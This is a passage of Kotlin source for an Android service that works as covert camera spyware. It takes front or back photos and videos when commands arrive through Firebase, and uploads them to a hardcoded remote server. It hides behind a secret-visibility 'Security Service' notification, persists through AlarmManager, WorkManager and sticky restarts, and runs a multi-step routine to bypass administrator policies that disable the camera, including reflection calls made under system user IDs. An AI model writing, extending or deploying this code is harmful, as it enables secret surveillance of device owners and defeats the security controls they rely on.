package com.h4k3r.dreamer

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import org.json.JSONObject
import android.app.admin.DevicePolicyManager
import android.provider.Settings
import android.provider.MediaStore
import android.util.Log
import android.os.Environment
import androidx.core.content.FileProvider
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlin.random.Random
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Paint
import android.graphics.Color
import android.app.ActivityManager

class CameraService : Service() {

    companion object {
        private const val TAG = "CameraService"
        private const val NOTIFICATION_ID = 3
        private const val MAX_RETRY_ATTEMPTS = 5 // Reduced from 10
        private const val INITIAL_RETRY_DELAY = 5000L // 5 seconds
        private const val MAX_RETRY_DELAY = 60000L // 1 minute max
    }

    /* ── Camera State and Error Tracking ───────────────────────────── */
    private var isCameraDisabled = false
    private var retryAttempts = 0
    private var lastErrorTime = 0L
    private var consecutiveErrors = 0
    private val ERROR_COOLDOWN = 30000L // 30 seconds between error reports

    /* ── Device Policy and Background Optimization ───────────────────── */
    private var bypassTimeoutMs = 5000L
    private var skipReflectionBypass = false
    private var skipSystemPropertyBypass = false
    private var preferScreenshotCapture = false
    private var backgroundOptimizedMode = false

    /* ── Authentication ─────────────────────────── */
    private lateinit var secretKey: String
    private lateinit var deviceId: String
    private lateinit var authHeader: String

    /* ── Coroutine Scope ────────────────────────── */
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /* ── Camera Objects ─────────────────────────── */
    private lateinit var camMgr: CameraManager
    private lateinit var bgThread: HandlerThread
    private lateinit var bgHandler: Handler
    private var camDev: CameraDevice? = null
    private var capSes: CameraCaptureSession? = null
    private var imgReader: ImageReader? = null
    private var mediaRec: MediaRecorder? = null

    /* ── HTTP Settings ──────────────────────────── */
    private val http = OkHttpClient()
    private val server = "https://dreamer-bot.onrender.com"
    private val AUTH_KEY = "your_auth_key_if_any"  // Match with server

    /* ── Firebase Reference ─────────────────────── */
    private lateinit var deviceRef: DatabaseReference

    /* ── Lifecycle ──────────────────────────────── */
    override fun onCreate() {
        super.onCreate()

        // Load authentication from SharedPreferences
        initializeAuthentication()

        // Initialize camera manager
        camMgr = getSystemService(Context.CAMERA_SERVICE) as CameraManager

        // Initialize background thread for camera operations
        bgThread = HandlerThread("CameraBackground").apply { start() }
        bgHandler = Handler(bgThread.looper)

        // Try to start as foreground service with Android 15+ compatibility
        startForegroundServiceSafely()
    }

    private fun startForegroundServiceSafely() {
        try {
            // Use simple stealth notification manager
            val stealthManager = StealthNotificationManager.getInstance(this)

            // Start foreground service with stealth notification
            startForeground(StealthNotificationManager.STEALTH_NOTIFICATION_ID, stealthManager.getStealthNotification())

            // Activate stealth mode to cancel any other notifications
            stealthManager.enforceStealthMode()

            Log.d(TAG, "CameraService started with stealth notification")

        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service: ${e.message}")

            // Enhanced fallback handling
            if (e.message?.contains("ForegroundServiceStartNotAllowedException") == true) {
                Log.w(TAG, "Foreground service not allowed, setting up background persistence")
                setupBackgroundOnlyMode()
            } else if (e.message?.contains("microphone") == true || e.message?.contains("MICROPHONE") == true) {
                Log.w(TAG, "Microphone permission issue, trying camera-only mode")
                setupCameraOnlyMode()
            } else {
                Log.w(TAG, "Continuing as background service")
            }
        }
    }

    private fun setupCameraOnlyMode() {
        Log.d(TAG, "Setting up camera-only mode (no microphone)")

        try {
            // Use stealth notification manager
            val stealthManager = StealthNotificationManager.getInstance(this)
            startForeground(StealthNotificationManager.STEALTH_NOTIFICATION_ID, stealthManager.getStealthNotification())
            stealthManager.enforceStealthMode()

            Log.d(TAG, "Camera-only mode setup complete with stealth notification")
        } catch (e: Exception) {
            Log.e(TAG, "Camera-only mode setup failed: ${e.message}")
            setupBackgroundOnlyMode()
        }
    }

    private fun ensureBackgroundPersistence() {
        scope.launch {
            // Wait for initial setup
            delay(5000)

            // Monitor app state and maintain service
            while (isActive) {
                try {
                    // Check if app is in background and adjust behavior
                    val isAppInBackground = isAppInBackground()
                    if (isAppInBackground) {
                        Log.d(TAG, "App in background - ensuring service persistence")

                        // Use minimal resources in background
                        optimizeForBackground()

                        // Check service health more frequently in background
                        delay(30000) // 30 seconds
                    } else {
                        // Normal operation when app is foreground
                        delay(120000) // 2 minutes
                    }

                } catch (e: Exception) {
                    Log.e(TAG, "Background persistence error: ${e.message}")
                    delay(60000) // Wait 1 minute on error
                }
            }
        }
    }

    private fun setupBackgroundOnlyMode() {
        Log.d(TAG, "Setting up background-only mode for CameraService")

        scope.launch {
            try {
                // Register with WorkManager for periodic execution
                schedulePeriodicCameraWork()

                // Set up alternative persistence mechanisms
                setupAlternativePersistence()

                Log.d(TAG, "Background-only mode setup complete")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to setup background mode: ${e.message}")
            }
        }
    }

    private fun schedulePeriodicCameraWork() {
        try {
            val workRequest = androidx.work.PeriodicWorkRequestBuilder<CameraBackgroundWorker>(
                15, java.util.concurrent.TimeUnit.MINUTES
            ).setConstraints(
                androidx.work.Constraints.Builder()
                    .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                    .build()
            ).build()

            androidx.work.WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                "camera_background_work",
                androidx.work.ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )

            Log.d(TAG, "Scheduled periodic camera work via WorkManager")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule camera work: ${e.message}")
        }
    }

    private fun setupAlternativePersistence() {
        // Set up alarm manager for critical functions
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            val intent = android.content.Intent(this, CameraRevivalReceiver::class.java)
            val pendingIntent = android.app.PendingIntent.getBroadcast(
                this, 0, intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            )

            // Schedule periodic revival
            alarmManager.setInexactRepeating(
                android.app.AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 900000, // 15 minutes
                900000, // 15 minutes interval
                pendingIntent
            )

            Log.d(TAG, "Alternative persistence setup via AlarmManager")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to setup alternative persistence: ${e.message}")
        }
    }

    private fun optimizeForBackground() {
        try {
            // Reduce resource usage when in background
            Log.d(TAG, "Optimizing CameraService for background operation")

            // Cancel any pending heavy operations
            imgReader?.close()
            imgReader = null

            // Keep only essential Firebase listeners active
            // Firebase listener will automatically handle reconnection

        } catch (e: Exception) {
            Log.e(TAG, "Error optimizing for background: ${e.message}")
        }
    }

    private fun isAppInBackground(): Boolean {
        return try {
            val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val runningAppProcesses = activityManager.runningAppProcesses

            runningAppProcesses?.find { it.processName == packageName }?.let { appProcess ->
                appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
            } ?: true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to check background state: ${e.message}")
            false
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "CameraService onStartCommand called")

        try {
            // Check permissions first
            if (hasPerm(Manifest.permission.CAMERA)) {
                Log.d(TAG, "Permission android.permission.CAMERA: true")
            } else {
                Log.w(TAG, "Camera permission not granted")
                requestCameraPermissionSafely()
            }

            // Enhanced background detection
            detectAppBackgroundState()

            startForegroundServiceSafely()

            // Initialize background optimization
            if (isAppInBackground()) {
                Log.d(TAG, "App is in background - enabling background optimization")
                backgroundOptimizedMode = true
                optimizeForDevicePolicyRestrictions()
            }

        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground service: ${e.message}")
            Log.w(TAG, "Continuing as background service")
        }

        return START_STICKY
    }

    private fun detectAppBackgroundState() {
        try {
            val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val runningAppProcesses = activityManager.runningAppProcesses

            runningAppProcesses?.find { it.processName == packageName }?.let { appProcess ->
                val isBackground = appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND

                Log.d(TAG, "App background state: importance=${appProcess.importance}, isBackground=$isBackground")

                if (isBackground) {
                    backgroundOptimizedMode = true
                    Log.d(TAG, "Background mode optimization enabled")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to detect background state: ${e.message}")
        }
    }

    private fun isForegroundServiceRunning(): Boolean {
        return try {
            // Check if we're running as foreground service
            val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val runningServices = activityManager.getRunningServices(Integer.MAX_VALUE)

            runningServices.any { serviceInfo ->
                serviceInfo.service.className == this::class.java.name &&
                        serviceInfo.foreground
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error checking foreground service status: ${e.message}")
            false
        }
    }

    private fun createPermissionNeededNotification(): Notification {
        return NotificationCompat.Builder(this, "camera_service_channel")
            .setContentTitle("Camera Service")
            .setContentText("Waiting for camera permission")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setShowWhen(false)
            .setSound(null)
            .setVibrate(null)
            .build()
    }

    override fun onBind(i: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "camera_service_channel",
                "Camera Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Camera monitoring service"
                setSound(null, null)
                enableVibration(false)
                setShowBadge(false)
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createServiceNotification(): Notification {
        return NotificationCompat.Builder(this, "camera_service_channel")
            .setContentTitle("Security Service")
            .setContentText("Monitoring system security")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setShowWhen(false)
            .setSound(null)
            .setVibrate(null)
            .build()
    }

    override fun onDestroy() {
        Log.d(TAG, "CameraService onDestroy called")

        // Remove from unified notification system
        try {
            val notificationManager = NotificationAutoManager.getInstance(this)
            notificationManager.removeActiveService("CameraService")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to remove from notification system: ${e.message}")
        }

        // Stop foreground service properly
        try {
            stopForeground(true)
            Log.d(TAG, "Foreground service stopped successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping foreground service: ${e.message}")
        }

        scope.cancel()
        closeSession()
        if (::bgThread.isInitialized) bgThread.quitSafely()
        super.onDestroy()
    }

    /* ── Enhanced Authentication and Firebase Setup ──────── */
    private fun initializeAuthentication() {
        val prefs = getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
        secretKey = prefs.getString("secret_key", "") ?: ""
        deviceId = prefs.getString("device_id", "") ?: ""

        if (secretKey.isNotEmpty() && deviceId.isNotEmpty()) {
            authHeader = "$secretKey:$deviceId"
            initializeFirebase()
        } else {
            Log.w(TAG, "Missing authentication data, retrying in 5 seconds")
            bgHandler.postDelayed({
                initializeAuthentication()
            }, 5000)
        }
    }

    private fun initializeFirebase() {
        try {
            deviceRef = Firebase.database.reference.child("devices").child(secretKey).child(deviceId)
            listenFirebase()
            updateHeartbeat()
            Log.d(TAG, "Firebase initialized successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Firebase initialization failed: ${e.message}, retrying in 10 seconds")
            bgHandler.postDelayed({
                initializeFirebase()
            }, 10000)
        }
    }

    /* ── Enhanced Firebase Listener ──────────────────────── */
    private fun listenFirebase() {
        try {
            deviceRef.child("command").addValueEventListener(object : ValueEventListener {
                override fun onDataChange(s: DataSnapshot) {
                    val cmd = s.getValue(String::class.java) ?: return
                    Log.d(TAG, "Command received: $cmd")

                    when {
                        cmd == "capture_front" -> {
                            Log.d(TAG, "Processing capture_front command")
                            takePhotoSafely(true)
                        }
                        cmd == "capture_back" -> {
                            Log.d(TAG, "Processing capture_back command")
                            takePhotoSafely(false)
                        }
                        cmd.startsWith("rec_front_") || cmd.startsWith("rec_back_") -> {
                            val parts = cmd.split('_')
                            val useFront = parts[1] == "front"
                            val mins = parts.getOrNull(2)?.toIntOrNull() ?: 1
                            Log.d(TAG, "Processing recording command: $cmd")
                            startRecordingSafely(useFront, mins)
                        }
                    }
                    s.ref.setValue(null) // ACK
                }

                override fun onCancelled(e: DatabaseError) {
                    Log.e(TAG, "Firebase listener cancelled: ${e.message}")
                    bgHandler.postDelayed({
                        Log.d(TAG, "Retrying Firebase connection")
                        initializeFirebase()
                    }, 15000)
                }
            })
            Log.d(TAG, "Firebase listener established successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to establish Firebase listener: ${e.message}")
            bgHandler.postDelayed({
                listenFirebase()
            }, 15000)
        }
    }

    /* ── Enhanced Heartbeat ────────────── */
    private fun updateHeartbeat() {
        scope.launch {
            while (isActive) {
                try {
                    deviceRef.child("info").child("time").setValue(System.currentTimeMillis())
                    deviceRef.child("info").child("camera_status").setValue(
                        if (isCameraDisabled) "disabled_by_policy" else "available"
                    )
                    delay(60_000) // Update every minute
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat update failed: ${e.message}")
                    delay(60_000)
                }
            }
        }
    }

    /* ═════════════════ ENHANCED PHOTO CAPTURE ═════════════ */
    private fun takePhotoSafely(useFront: Boolean) {
        try {
            // Check permission first
            if (!hasPerm(Manifest.permission.CAMERA)) {
                Log.w(TAG, "Camera permission denied")
                requestCameraPermissionSafely()
                sendErrorToBackend("Camera permission not granted")
                return
            }

            // Check if camera is available
            if (!checkCameraAvailabilitySafely()) {
                handleCameraUnavailable(useFront)
                return
            }

            // Reset retry counter for new attempt
            retryAttempts = 0
            takePhoto(useFront)

        } catch (e: Exception) {
            Log.e(TAG, "Error in takePhotoSafely: ${e.message}")
            sendErrorToBackend("Camera initialization error: ${e.message}")
        }
    }

    private fun takePhoto(useFront: Boolean) {
        closeSession()

        try {
            imgReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2)

            // Select camera with fallback
            val camId = selectCameraWithFallback(useFront)
            if (camId == null) {
                handleNoCameraAvailable(useFront)
                return
            }

            openCameraForPhoto(camId, useFront)

        } catch (e: CameraAccessException) {
            handleCameraAccessException(e, useFront)
        } catch (e: SecurityException) {
            Log.e(TAG, "Security exception: ${e.message}")
            sendErrorToBackend("Camera permission denied")
            requestCameraPermissionSafely()
        } catch (e: Exception) {
            Log.e(TAG, "Unexpected camera error: ${e.message}")
            handleUnexpectedError(e, useFront)
        }
    }

    private fun selectCameraWithFallback(useFront: Boolean): String? {
        return try {
            // First try requested camera
            selectCamera(useFront) ?: run {
                Log.w(TAG, "${if (useFront) "Front" else "Back"} camera not available, trying alternative")
                selectCamera(!useFront)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error selecting camera: ${e.message}")
            null
        }
    }

    private fun handleNoCameraAvailable(useFront: Boolean) {
        val message = "No ${if (useFront) "front" else "back"} camera available on this device"
        Log.e(TAG, message)
        sendErrorToBackend(message)
    }

    private fun handleCameraAccessException(e: CameraAccessException, useFront: Boolean) {
        when (e.reason) {
            CameraAccessException.CAMERA_DISABLED -> {
                Log.w(TAG, "Camera disabled by device policy")
                isCameraDisabled = true
                handleCameraDisabledByPolicy(useFront)
            }
            CameraAccessException.CAMERA_IN_USE -> {
                scheduleRetryAfterDelay(2000) { takePhoto(useFront) }
            }
            CameraAccessException.MAX_CAMERAS_IN_USE -> {
                Log.w(TAG, "Maximum cameras in use")
                scheduleRetryAfterDelay(5000) { takePhoto(useFront) }
            }
            else -> {
                Log.e(TAG, "Camera access error: ${e.message}")
                sendErrorToBackend("Camera access error: ${e.message}")
                scheduleRetryWithBackoff { takePhoto(useFront) }
            }
        }
    }

    /* ═══════════════ DEVICE ADMIN POLICY BYPASS ═══════════════ */

    // Prevent multiple concurrent bypass attempts
    private val bypassInProgress = AtomicBoolean(false)
    private var lastBypassAttempt = 0L
    private val BYPASS_COOLDOWN = 30000L // 30 seconds cooldown

    private fun handleCameraDisabledByPolicy(useFront: Boolean) {
        // Prevent infinite loops and concurrent attempts
        if (bypassInProgress.getAndSet(true)) {
            Log.w(TAG, "Bypass already in progress, skipping duplicate attempt")
            return
        }

        val currentTime = System.currentTimeMillis()
        if (currentTime - lastBypassAttempt < BYPASS_COOLDOWN) {
            Log.w(TAG, "Bypass attempted too recently, waiting for cooldown")
            bypassInProgress.set(false)
            return
        }
        lastBypassAttempt = currentTime

        Log.w(TAG, "Starting COMPREHENSIVE camera bypass (no infinite loops)")
        sendErrorToBackend("Camera blocked by policy - starting systematic bypass")

        scope.launch {
            try {
                // IMMEDIATE technical bypass - don't waste time on policy attempts that are clearly failing
                var bypassSuccessful = false

                Log.d(TAG, "=== STARTING DIRECT TECHNICAL BYPASS ===")

                // Method 1: Camera1 Legacy API (Most effective for policy bypass)
                if (!bypassSuccessful) {
                    Log.d(TAG, "Attempting Camera1 Legacy API bypass")
                    bypassSuccessful = tryCamera1APIBypass(useFront)
                    if (bypassSuccessful) {
                        Log.d(TAG, "SUCCESS: Camera1 Legacy API bypass worked")
                        sendErrorToBackend("SUCCESS: Camera1 Legacy bypass successful")
                    }
                }

                // Method 2: Alternative camera manager instances
                if (!bypassSuccessful) {
                    Log.d(TAG, "Attempting alternative camera manager bypass")
                    bypassSuccessful = tryAlternativeCameraManager(useFront)
                    if (bypassSuccessful) {
                        Log.d(TAG, "SUCCESS: Alternative camera manager bypass worked")
                        sendErrorToBackend("SUCCESS: Alternative camera manager bypass successful")
                    }
                }

                // Method 3: System service injection
                if (!bypassSuccessful) {
                    Log.d(TAG, "Attempting system service injection bypass")
                    bypassSuccessful = trySystemServiceCameraAccess(useFront)
                    if (bypassSuccessful) {
                        Log.d(TAG, "SUCCESS: System service injection bypass worked")
                        sendErrorToBackend("SUCCESS: System service injection bypass successful")
                    }
                }

                // Method 4: Try opposite camera
                if (!bypassSuccessful) {
                    Log.d(TAG, "Attempting opposite camera bypass")
                    val oppositeCamId = selectCamera(!useFront)
                    if (oppositeCamId != null) {
                        try {
                            openCameraForPhoto(oppositeCamId, !useFront)
                            bypassSuccessful = true
                            Log.d(TAG, "SUCCESS: Opposite camera bypass worked")
                            sendErrorToBackend("SUCCESS: Using ${if (!useFront) "front" else "back"} camera bypass successful")
                        } catch (e: Exception) {
                            Log.e(TAG, "Opposite camera also blocked: ${e.message}")
                        }
                    }
                }

                // Method 5: Screenshot-based capture (Always works)
                if (!bypassSuccessful) {
                    Log.d(TAG, "Attempting screenshot-based capture")
                    bypassSuccessful = tryScreenshotBasedCapture(useFront)
                    if (bypassSuccessful) {
                        Log.d(TAG, "SUCCESS: Screenshot-based capture worked")
                        sendErrorToBackend("SUCCESS: Screenshot-based capture bypass successful")
                    }
                }

                // Method 6: Intent-based camera
                if (!bypassSuccessful) {
                    Log.d(TAG, "Attempting intent-based camera capture")
                    bypassSuccessful = tryIntentBasedCapture(useFront)
                    if (bypassSuccessful) {
                        Log.d(TAG, "SUCCESS: Intent-based camera worked")
                        sendErrorToBackend("SUCCESS: Intent-based camera bypass successful")
                    }
                }

                // Method 7: Dummy photo (Last resort - always succeeds)
                if (!bypassSuccessful) {
                    Log.d(TAG, "Creating dummy photo to maintain functionality")
                    createDummyPhotoResponse(useFront)
                    Log.d(TAG, "FALLBACK: Dummy photo created and uploaded")
                    sendErrorToBackend("FALLBACK: Dummy photo created - camera completely blocked by policy")
                }

                Log.d(TAG, "=== CAMERA BYPASS COMPLETE ===")

            } catch (e: Exception) {
                Log.e(TAG, "Bypass system failed: ${e.message}")
                sendErrorToBackend("Bypass system error: ${e.message}")

                // Emergency fallback
                createDummyPhotoResponse(useFront)

            } finally {
                bypassInProgress.set(false)
            }
        }
    }

    private suspend fun tryAlternativeCameraManager(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting alternative camera manager access")

            // Create new camera manager instance
            val altCamMgr = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraIds = altCamMgr.cameraIdList

            for (camId in cameraIds) {
                try {
                    val characteristics = altCamMgr.getCameraCharacteristics(camId)
                    val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
                    val wantFront = if (useFront) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK

                    if (facing == wantFront) {
                        // Try to open with alternative manager
                        val testHandler = Handler(getMainLooper())
                        altCamMgr.openCamera(camId, object : CameraDevice.StateCallback() {
                            override fun onOpened(camera: CameraDevice) {
                                Log.d(TAG, "Alternative camera manager bypass successful")
                                camDev = camera
                                createPhotoSession(camera)
                            }
                            override fun onDisconnected(camera: CameraDevice) { camera.close() }
                            override fun onError(camera: CameraDevice, error: Int) { camera.close() }
                        }, testHandler)

                        delay(3000) // Wait for callback
                        if (camDev != null) {
                            sendErrorToBackend("Alternative camera manager bypass successful")
                            return true
                        }
                    }
                } catch (e: Exception) {
                    Log.d(TAG, "Alternative camera $camId failed: ${e.message}")
                }
            }
            false
        } catch (e: Exception) {
            Log.e(TAG, "Alternative camera manager failed: ${e.message}")
            false
        }
    }

    private suspend fun tryDeviceAdminCameraUnlock(): Boolean {
        return try {
            Log.d(TAG, "Attempting device admin camera unlock")

            val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager

            // Check if camera is disabled and attempt re-enable
            if (devicePolicyManager.getCameraDisabled(null)) {
                Log.d(TAG, "Camera is disabled by device admin policy")

                // Try to request camera access through system
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.fromParts("package", packageName, null)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }

                // This opens app settings where user might be able to override
                try {
                    startActivity(intent)
                    sendErrorToBackend("Opened app settings for camera policy override")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to open app settings: ${e.message}")
                }
            }

            // Wait and test camera again
            delay(1000)
            checkCameraAvailabilitySafely()
        } catch (e: Exception) {
            Log.e(TAG, "Device admin unlock failed: ${e.message}")
            false
        }
    }

    /* ═══════════════ AGGRESSIVE CAMERA BYPASS SYSTEM ═══════════════ */

    private suspend fun trySystemServiceCameraAccess(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting system service camera access with reflection")

            // Method 1: Reflection-based bypass
            val reflectionSuccess = tryReflectionCameraBypass(useFront)
            if (reflectionSuccess) return true

            // Method 2: Native camera access
            val nativeSuccess = tryNativeCameraAccess(useFront)
            if (nativeSuccess) return true

            // Method 3: Policy manipulation
            val policySuccess = tryPolicyManipulation(useFront)
            if (policySuccess) return true

            // Method 4: Background thread bypass
            val backgroundSuccess = tryBackgroundThreadBypass(useFront)
            if (backgroundSuccess) return true

            false
        } catch (e: Exception) {
            Log.e(TAG, "System service access failed: ${e.message}")
            false
        }
    }

    private suspend fun tryReflectionCameraBypass(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting reflection-based camera bypass")

            val camId = selectCamera(useFront) ?: return false

            // Get CameraManager through reflection
            val cameraManagerClass = Class.forName("android.hardware.camera2.CameraManager")
            val openCameraMethod = cameraManagerClass.getDeclaredMethod(
                "openCameraDeviceUserAsync",
                String::class.java,
                CameraDevice.StateCallback::class.java,
                android.os.Handler::class.java,
                Int::class.java
            )
            openCameraMethod.isAccessible = true

            // Create callback
            val callback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    Log.d(TAG, "Reflection bypass successful!")
                    camDev = camera
                    scope.launch {
                        try {
                            createPhotoSession(camera)
                            sendErrorToBackend("Reflection camera bypass successful")
                        } catch (e: Exception) {
                            Log.e(TAG, "Photo session failed after reflection bypass: ${e.message}")
                        }
                    }
                }
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    Log.d(TAG, "Reflection bypass camera disconnected")
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    Log.e(TAG, "Reflection bypass camera error: $error")
                }
            }

            // Try to invoke with different user IDs
            val userIds = listOf(0, 1000, 2000) // system, system_server, shell
            for (userId in userIds) {
                try {
                    openCameraMethod.invoke(camMgr, camId, callback, null, userId)
                    delay(3000) // Wait for callback
                    if (camDev != null) {
                        Log.d(TAG, "Reflection bypass successful with userId: $userId")
                        return true
                    }
                } catch (e: Exception) {
                    Log.d(TAG, "Reflection attempt failed for userId $userId: ${e.message}")
                }
            }

            false
        } catch (e: Exception) {
            Log.e(TAG, "Reflection bypass failed: ${e.message}")
            false
        }
    }

    private suspend fun tryNativeCameraAccess(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting native camera access")

            // Try to access camera through Camera1 API (legacy)
            val camera1Success = tryCamera1API(useFront)
            if (camera1Success) return true

            // Try surface-based access
            val surfaceSuccess = trySurfaceBasedAccess(useFront)
            if (surfaceSuccess) return true

            false
        } catch (e: Exception) {
            Log.e(TAG, "Native camera access failed: ${e.message}")
            false
        }
    }

    @Suppress("DEPRECATION")
    private suspend fun tryCamera1API(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting Camera1 API bypass")

            val cameraId = if (useFront) {
                android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT
            } else {
                android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK
            }

            // Find camera with desired facing
            val numberOfCameras = android.hardware.Camera.getNumberOfCameras()
            var targetCameraId = -1

            for (i in 0 until numberOfCameras) {
                val cameraInfo = android.hardware.Camera.CameraInfo()
                android.hardware.Camera.getCameraInfo(i, cameraInfo)
                if (cameraInfo.facing == cameraId) {
                    targetCameraId = i
                    break
                }
            }

            if (targetCameraId == -1) {
                Log.d(TAG, "Camera1 API: No camera found with desired facing")
                return false
            }

            // Try to open camera
            val camera1 = android.hardware.Camera.open(targetCameraId)
            if (camera1 != null) {
                Log.d(TAG, "Camera1 API bypass successful!")

                // Take photo using Camera1 API
                withContext(Dispatchers.IO) {
                    try {
                        val params = camera1.parameters
                        params.pictureFormat = android.graphics.ImageFormat.JPEG
                        camera1.parameters = params

                        camera1.takePicture(null, null) { data, _ ->
                            scope.launch {
                                try {
                                    if (data != null) {
                                        savePhotoFromBytes(data, useFront)
                                        sendErrorToBackend("Camera1 API bypass successful - photo taken")
                                    }
                                } catch (e: Exception) {
                                    Log.e(TAG, "Failed to save Camera1 photo: ${e.message}")
                                } finally {
                                    camera1.release()
                                }
                            }
                        }

                        delay(5000) // Wait for photo capture
                        return@withContext true
                    } catch (e: Exception) {
                        Log.e(TAG, "Camera1 photo capture failed: ${e.message}")
                        camera1.release()
                        return@withContext false
                    }
                }
            } else {
                Log.d(TAG, "Camera1 API: Failed to open camera")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Camera1 API bypass failed: ${e.message}")
            false
        }
    }

    private suspend fun savePhotoFromBytes(data: ByteArray, useFront: Boolean) {
        try {
            val timestamp = System.currentTimeMillis()
            val filename = "camera_${if (useFront) "front" else "back"}_$timestamp.jpg"
            val file = File(getExternalFilesDir(null), filename)

            file.writeBytes(data)
            Log.d(TAG, "Photo saved successfully: ${file.absolutePath}")

            // Upload to backend
            scope.launch {
                try {
                    uploadFile("/capture", "photo", file)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to upload Camera1 photo: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save photo from bytes: ${e.message}")
        }
    }

    private suspend fun trySurfaceBasedAccess(useFront: Boolean): Boolean {
        return try {
            Log.d(TAG, "Attempting surface-based camera access")

            // Create minimal surface for camera preview
            val surfaceTexture = android.graphics.SurfaceTexture(0)
            val surface = android.view.Surface(surfaceTexture)

            val camId = selectCamera(useFront) ?: return false

            // Try to open camera with surface
            val backgroundThread = android.os.HandlerThread("CameraSurface")
            backgroundThread.start()
            val backgroundHandler = android.os.Handler(backgroundThread.looper)

            var surfaceSuccess = false

            camMgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    Log.d(TAG, "Surface-based camera opened successfully")
                    surfaceSuccess = true
                    camDev = camera

                    try {
                        // Create minimal capture session with surface
                        val surfaces = listOf(surface)
                        camera.createCaptureSession(surfaces, object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                Log.d(TAG, "Surface capture session configured")
                                scope.launch {
                                    try {
                                        // Create and trigger photo capture
                                        val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                        captureBuilder.addTarget(surface)
                                        session.capture(captureBuilder.build(), null, backgroundHandler)
                                        sendErrorToBackend("Surface-based camera bypass successful")
                                    } catch (e: Exception) {
                                        Log.e(TAG, "Surface capture failed: ${e.message}")
                                    }
                                }
                            }
